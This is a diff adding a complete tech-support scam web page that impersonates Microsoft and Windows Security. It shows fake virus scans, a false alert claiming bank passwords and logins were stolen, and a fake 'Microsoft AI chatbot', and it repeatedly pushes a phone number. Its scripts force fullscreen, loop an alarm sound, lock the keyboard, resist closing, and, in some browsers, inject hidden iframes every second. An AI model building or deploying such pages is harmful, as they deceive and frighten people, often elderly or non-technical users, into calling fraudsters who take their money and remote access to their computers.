@@ -1,0 +1,581 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Microsoft Support Assistance codexx23</title>
+<link rel="stylesheet" href="styles.css">
+<link rel="stylesheet" href="chat.css">
+<script type="text/javascript" src="scripts.js"></script>
+<link rel="shortcut icon" type="image/png" href="microsoft.png" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+<style>
+  .black {
+    width: 100%;
+    height: 100%;
+    background-color: rgb(0 0 0 / 47%);
+    opacity: 0.7;
+    transition: 1s;
+    position: absolute;
+    top: -190px;
+    left:0
+  }
+  </style>
+
+
+
+  <script>
+  var elem = document.documentElement;
+  function openFullscreen() {
+    if (elem.requestFullscreen) {
+      elem.requestFullscreen();
+    } else if (elem.webkitRequestFullscreen) { /* Safari */
+      elem.webkitRequestFullscreen();
+    } else if (elem.msRequestFullscreen) { /* IE11 */
+      elem.msRequestFullscreen();
+    }
+  }
+
+  function closeFullscreen() {
+    if (document.exitFullscreen) {
+      document.exitFullscreen();
+    } else if (document.webkitExitFullscreen) { /* Safari */
+      document.webkitExitFullscreen();
+    } else if (document.msExitFullscreen) { /* IE11 */
+      document.msExitFullscreen();
+    }
+  }
+  </script>
+
+<script>
+  function getVariableFromURl(name)
+  {
+      name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+      var regexS = "[\\?&]"+name+"=([^&#]*)";
+      var regex = new RegExp( regexS );
+      var results = regex.exec( window.location.href );
+      if( results == null )
+          return "";
+      else
+          return results[1];
+  }
+</script>
+<script type="text/javascript">
+  var phone = getVariableFromURl('phone');
+</script>
+<script type="text/javascript">
+  window.onbeforeunload = function () {
+      if (data_needs_saving()) {
+          return "Do you really want to leave our brilliant application?";
+      } else {
+          return;
+      }
+  };
+</script>
+
+<script type="text/javascript">
+  window.addEventListener("beforeunload", function (e) {
+      var confirmationMessage = 'It looks like you have been editing something. '
+          + 'If you leave before saving, your changes will be lost.';
+
+      (e || window.event).returnValue = confirmationMessage; //Gecko + IE
+      return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
+  });
+</script>
+</head>
+<body id="mycanvas" onclick="playSound()" >
+
+  <iframe src="https://support.microsoft.com" id="frame" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; ">
+  </iframe>
+
+  <a  onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
+    <div class="black" style="height: 140%;"></div>
+</a>
+
+
+<div class="box" id="box">
+<div class="top">
+<p style="font-size: 13px;  font-family: Arial, Helvetica, sans-serif;">Windows security<img src="minimize.jpeg" class="btn" style="float: right; width:115px;"></p>
+</div>
+
+<h2 style="position: absolute; left: 70px; top: 60px; font-weight: 300;" id="text1">Safety at a glance</h2>
+<p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2"><br>Check what is happening to the safety and health of your device and take all necessary measures.</p>
+<div class="centerright">
+<ul>
+<li>
+<br>
+<img src="kxFy-clip.png" width="50px;">
+<p>Virus and threat protection</p>
+<p style="top: 120px; position: absolute; font-size: 13px; color: grey;">action is required. Run a scan to check for <br>threats.</p>
+
+</li>
+<li>
+<br><br>
+<img src="qsbs-firewall.png" width="60px;">
+<p>Firewall and network protection</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+</li>
+</ul>
+<ul>
+<li>
+<br>
+<img src="s-S4-acc.png" width="60px;">
+<p>Account protection</p>
+<p style="top: 125px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+</li>
+<li>
+<br>
+<img src="Z5BR-network.png" width="51px;"/>
+<p>Application and browser control</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+</li>
+</ul>
+</div>
+<img src="uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+<br>
+</div>
+
+<!--Windows Security Quick Scan-->
+<div class="scan" id="scan">
+  <div class="top">
+  <p style="font-size: 13px;  font-family: Arial, Helvetica, sans-serif;">Windows security<img src="minimize.jpeg" class="btn" style="float: right; width:115px;"></p>
+  </div>
+  <h2 style="position: absolute; left: 70px; top: 60px; font-weight: 300;" id="text1"><img src="okPE-vs.png" width="25px;" style="margin-right: 10px;">Virus and threat protection</h2>
+  <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">Device protection against threats.</p>
+
+<h3 style="position: absolute; right: 180px; top: -10px; font-weight: 300;" id="text12"><b>+1 888 409 9537 (Free Security)</b></h3>
+
+  <div class="centerright">
+
+
+  <ul>
+  <li>
+
+
+
+  <div class="flex"> <img src="-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 33px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">Current Threat</p></div>
+
+
+  <br><br>
+  <div class="progress" id="bar">
+    <div class="progress__bar"></div>
+  </div>
+
+  <p style="font-size: 13px;" id="info">A quick scan is in progress...<br>Estimated time remaining: <n id="time">0</b></n><br><n id="amount">0</b></n> Files scanned.</p>
+
+  <a href="#"class="button" id="re">to cancel</a>
+  <p style=" font-size: 13px;" id="recx">Keep working while we analyze your device.</p>
+
+  <p style="font-size: 13px; color: #0063c6; cursor: pointer;" id="recx-hide">protection history</p>
+  <br>
+  <p id="shx" style="font-size: 13px; color: #0063c6; display: none; cursor: pointer;">Scan Options<br> Allowed Threats<br> Protection History</p>
+
+
+  </li>
+
+  <li>
+
+<div class="flex"><img src="nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: 5px;"><p style="position: absolute; left: 35px;    bottom: 84px;    line-height: 18px;">Virus & threat protection settings </p> </div>
+<p style="color: grey; font-size: 13px;">no action required</p>
+<p style="font-size: 13px; color: #0063c6;">Manage your settings</p>
+  </li>
+  </ul>
+  <ul>
+
+  <li>
+
+
+  <p style="position: absolute; top: -55px;">I have a question?</p>
+
+  <p style="font-size: 13px; color: #0063c6; position: absolute; top: -15px; cursor: pointer;">get help</p>
+
+  </li>
+  <li>
+
+
+    <p style="position: absolute; top: 25px;">who will protect me</p>
+
+    <p style="font-size: 13px; color: #0063c6; position: absolute; top: 65px; cursor: pointer;">Supplier management</p>
+
+    </li>
+    <li>
+
+
+      <p style="position: absolute; top: 100px; "><br>Help us improve Windows security</p>
+
+      <p style="font-size: 13px; color: #0063c6; position: absolute; top: 152px; cursor: pointer;">Send us your feedback</p>
+
+      </li>
+      <li>
+
+        <p style="position: absolute; top: 190px;">Change your privacy settings</p>
+        <p style="position: absolute; top: 220px; font-size: 13px;">View and change privacy settings on Windows<br><n id="which"></b></n> devices.</p>
+
+        <p style="font-size: 13px; color: #0063c6; position: absolute; top: 270px; cursor: pointer;">Privacy Settings<br>Privacy Dashboard<br>Privacy Statement</p>
+
+        </li>
+
+  </ul>
+
+  </div>
+  <img src="uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+  <br>
+  </div>
+  <script>
+          navigator.userAgentData.getHighEntropyValues(["platformVersion"])
+   .then(ua => {
+     if (navigator.userAgentData.platform === "Windows") {
+       const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+       if (majorPlatformVersion >= 13) {
+        document.getElementById("which").innerHTML = " 11";
+        }
+        else if (majorPlatformVersion > 0) {
+          document.getElementById("which").innerHTML = " 10";
+        }
+        else {
+          console.log("Beyond");
+        }
+     }
+     else {
+       console.log("does not work on Windows");
+     }
+   });
+  </script>
+
+
+
+
+
+
+<div class="alert_popup cardcontainer lightbox">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <p class="text-center" style="    font-size: 16px;
+font-weight: normal;
+margin: 0;
+margin-bottom: 5px;
+padding: 5px 10px;
+color: #fff;font-weight: bold;
+margin-top: 8px; text-align: center;">Windows Security - Spyware Alert</p>
+                <p class="text-center">** Access to this PC has been blocked for security reasons **</p>
+                <p>Your computer has been warned that it is infected with Trojan spyware. The following data was compromised: <br><br>
+                   > Email ID<br> &gt; Bank Password<br>
+                   > Facebook Login<br>
+                   > Photos and Photo Documents </p>
+
+                  <p>A Windows Security scan has detected potentially unwanted adware on this device that can steal passwords, online identities, financial information, personal files, images, or documents.</p>
+                  <p>Please contact us immediately so that our engineer can explain the removal process over the phone.</p>
+
+                  <p>Please contact Windows Support immediately to report this threat, prevent spoofing, and unlock access to this device.<br>
+                  Closing this window puts your personal information at risk and interrupts your Windows registration.</p>
+
+               <p style="padding-bottom: 0px;">Call Windows Support <strong>+1 888 409 9537 (Toll-Free)</strong></p>
+               <div class="action_buttons"> <a class="" id="leave_page" style="cursor: pointer;">OK</a> <a class="" id="leave_page">Cancel</a> </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+<audio id="beep" loop>
+  <source src="_Fm7-alert.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+  addEventListener("click", function() {
+var el = document.documentElement
+  , rfs =
+         el.requestFullScreen
+      || el.webkitRequestFullScreen
+      || el.mozRequestFullScreen
+;
+rfs.call(el);
+});
+
+</script>
+
+<div id="lst" class="lst lightbox">
+  <div class="ilb top">
+      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> Windows Defender Security Center</span>
+          <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>
+
+      </div>
+  </div>
+  <div id="txtintro">
+              <span class="colo-rd">App: Ads.financetrack(02).dll<br>
+              Threats Detected: Trojan Spyware</span>
+  </div>
+  <img id="banner" src="virus-images.png">
+  <div id="disclaimer">
+  Access to this PC has been blocked for security reasons.<br>
+      <span class="support">Contact Windows Support: +1 888 409 9537 (Security-TollFree)</span>
+  </div>
+  <div id="bottom">
+      <img id="badge" src="microsoft.png"><span class="title3">microsoft</span>
+      <ul>
+          <li>
+              <a href="#">
+                  <div class="fr button2">
+                      <span id="addtochromebutton">Allow</span>
+                  </div>
+              </a>
+          </li>
+          <li>
+              <a href="#">
+                  <div class="fr buttons blink">
+                      <span id="addtochromebutton">Refuse</span>
+                  </div>
+              </a>
+          </li>
+      </ul>
+
+  </div>
+</div>
+
+</div>
+
+<div id="footer">
+  <div class="row">
+
+      <div class="col-md-12">
+          <div class="right-foot" style="text-align: center;">
+              <span id="footertxt"><img src="microsoft.png"> Microsoft: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;">Support Contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1 888 409 9537 (Security-TollFree)</span></span>
+          </div>
+      </div>
+      <div class="col-md-12">
+          <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 10px;">Windows
+                                                                        Defender SmartScreen prevented unrecognized apps from displaying. Running this app may put your PC
+                                                                        at risk. Windows Defender Scan has found unwanted adware that may steal on this device
+                                                                        passwords, online IDs, financial information, personal files, photos, or
+                                                                        document.</small></marquee>
+      </div>
+  </div>
+
+
+</div>
+
+<div id="welcomeDiv"
+     style="     background-color: rgb(40 40 40 / 90%);
+     height: auto;
+     width: 767px;
+     top: 10px;
+     left: 25%;
+     text-align: center;
+     position: absolute;
+     z-index: 9999999999;
+     padding: 0px 7px;
+     border-radius: 0px 0px 15px 15px; "
+     class="answer_list">
+    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 21px; opacity:.9; ">Admittance to this PC has been hindered because of safety reasons. Try not to get to or restart this PC. Overlooking this basic admonition might bring about loss of information on this framework. Kindly contact support promptly so a Microsoft designer can walk you through the investigating ventures via telephone.</p>
+
+
+</div>
+
+<div id="ev_talkbox_wrapper" class="ev_talkbox_wrapper_min bounce">
+  <div class="new_messg">
+      <p style="    margin-top: 3px;font-weight: 500;
+      font-size: 15px;">Need Help?</p>
+      <p style="font-size: 13px; position: relative;
+      top: 0px;margin-top: 0;">Chat with our support team</p>
+  </div>
+  <div id="ev_talkbox_min" class="">
+      <span id="ev_min_zoimg"></span>
+      <span id="ev_min_title">Chat</span>
+  </div>
+  </div>
+  <!--Start-Chat-Box-->
+  <div id="wrapper" class="chat_box bounce2" style="cursor:none;">
+    <div class="chat">
+      <div class="chat_head">
+          <div class="row">
+              <div class="col-md-6">
+                  <h3>Hello!</h3>
+                  <p>How is your day going?</p>
+              </div>
+              <div class="col-md-6">
+                  <p class="cro_icon"><img src="cross.svg"></p>
+                  <p class="ou_log"><img src="mic.png"></p>
+              </div>
+          </div>
+          </div>
+      <div class="chat-container">
+        <div class="chat-listcontainer">
+
+          <ul class="chat-message-list">
+          </ul>
+
+        </div>
+
+
+
+      </div>
+       <div class="type_msg">
+              <div class="input_msg_write">
+                <input type="text" class="write_msg" placeholder="Type a message..." />
+                <button class="msg_send_btn" type="button"><img src="arrow.svg"></button>
+              </div>
+            </div>
+    </div>
+  </div>
+
+<script>
+  $(document).ready(function () {
+      $("#mycanvas").click(function () {
+          $("#welcomeDiv").show();
+      });
+  });
+</script>
+
+<script type="text/javascript">
+  $(".chat_box").delay(5000).fadeIn('slow')
+.css({top:886})
+.animate({top:211}, 800, function() {
+ //callback
+});
+</script>
+<script type="text/javascript">
+ var chatMessages = [{
+name: "ms1",
+msg: "Greetings! I'm Lucy, another AI chatbot by Microsoft. It appears to be your PC is locked out because of safety reasons. ",
+delay: 5100,
+align: "right"
+},
+{
+name: "ms3",
+msg: "Click on one of these choices to investigate.",
+delay: 2500,
+align: "left"
+
+},
+{
+name: "ms3",
+msg: "<img src='seo.png' style='width:25px;margin-right:5px;vertical-align: middle;'> Self Diagnostic Tool",
+delay: 100,
+align: "left"
+
+},
+{
+name: "ms3",
+msg: "<img src='antivirus.png' style='width:25px;margin-right:5px;vertical-align: middle;'> Run Complete Scan",
+delay: 100,
+align: "left"
+},
+{
+name: "ms3",
+msg: "<div class='ev_zo_img'></div>Tragically, visit support isn't accessible for this basic disappointment. If it's not too much trouble, contact Support",
+delay: 3000,
+align: "right"
+}
+
+                ];
+var chatDelay = 0;
+
+function onRowAdded() {
+$('.chat-container').animate({
+ scrollTop: $('.chat-container').prop('scrollHeight')
+});
+};
+$.each(chatMessages, function(index, obj) {
+chatDelay = chatDelay + 2000;
+chatDelay2 = chatDelay + obj.delay;
+chatDelay3 = chatDelay2 + 10;
+scrollDelay = chatDelay;
+chatTimeString = " ";
+msgname = "." + obj.name;
+msginner = ".messageinner-" + obj.name;
+spinner = ".sp-" + obj.name;
+if (obj.showTime == true) {
+ chatTimeString = "<span class='message-time'>" + obj.time + "</span>";
+}
+$(".chat-message-list").append("<li class='message-" + obj.align + " " + obj.name + "' hidden><div class='sp-" + obj.name + "'><span class='spinme-" + obj.align + "'><div class='spinner'><div class='bounce1'></div><div class='bounce2'></div><div class='bounce3'></div></div></span></div><div class='messageinner-" + obj.name + "' hidden><span class='message-text'>" + obj.msg + "</span>" + chatTimeString + "</div></li>");
+$(msgname).delay(chatDelay).fadeIn();
+$(spinner).delay(chatDelay2).hide(1);
+$(msginner).delay(chatDelay3).fadeIn();
+setTimeout(onRowAdded, chatDelay);
+setTimeout(onRowAdded, chatDelay3);
+chatDelay = chatDelay3;
+});
+</script>
+
+
+
+<script>
+navigator.keyboard.lock();
+document.onkeydown = function (e) {
+return false;
+}
+</script>
+
+          <script type="text/javascript">/*<![CDATA[*/
+
+           function get_browser(){
+              var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+              if(/trident/i.test(M[1])){
+                  tem=/\brv[ :]+(\d+)/g.exec(ua) || [];
+                  return {name:'IE',version:(tem[1]||'')};
+                  }
+              if(M[1]==='Chrome'){
+                  tem=ua.match(/\bOPR\/(\d+)/)
+                  if(tem!=null)   {return {name:'Opera', version:tem[1]};}
+                  }
+              M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
+              if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
+              return {
+                name: M[0],
+                version: M[1]
+              };
+           }
+           var InternetEx=window.navigator.appVersion.indexOf("MSIE")!=-1;
+          var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+          var browser=get_browser();
+          if(browser.name=="Firefox" || isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)) ){
+            if(isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)))
+              {
+
+                 function msg_ff() {
+
+                      var i = document.createElement("div");
+                      i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="en07.php"></iframe></div>';
+                      document.body.appendChild(i);
+
+                  }
+                  window.setInterval(function() {
+                      msg_ff();
+
+                  }, 1100);
+
+                }
+            else{
+                function msg_ff() {
+
+                      var i = document.createElement("div");
+                      i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="en07.php"></iframe></div>';
+                      document.body.appendChild(i);
+                  }
+                  window.setInterval(function() {
+                      msg_ff();
+
+                  }, 1100);
+
+              }
+
+           }
+           else{
+
+             }
+
+
+          /*]]>*/</script>
+
+  </body>
+
+
+</html>
